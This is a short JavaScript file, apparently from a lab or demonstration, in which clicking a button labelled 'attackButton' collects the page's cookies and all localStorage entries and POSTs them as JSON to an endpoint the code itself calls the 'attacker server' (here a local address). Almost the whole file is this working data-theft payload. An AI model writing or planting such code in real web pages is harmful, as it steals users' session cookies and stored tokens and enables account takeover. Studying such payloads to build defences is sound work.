// utils.js

// const logger = require('./logger');

document.getElementById('attackButton').addEventListener('click', () => {
    try {
        const cookies = document.cookie;
        // logger.info(`trigger-attack: Cookies: ${cookies}`);

        const localStorageData = {};
        for(const key in localStorage) {
            if(localStorage.hasOwnProperty(key)) {
                localStorageData[key] = localStorage.getItem(key);
            };
        };

        fetch("http://127.0.0.1:5000/api/data", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                cookies: cookies,
                localStorage: localStorageData
            }),
        })
        .then(response => response.text())
        .then(data => console.log("Response from attacker server:", data))
        .catch(error => console.error("Error:", error));
    } catch (error) {
        // logger.error(`Error: ${error}`);
        console.log(`Error: ${error}`);
    }
});
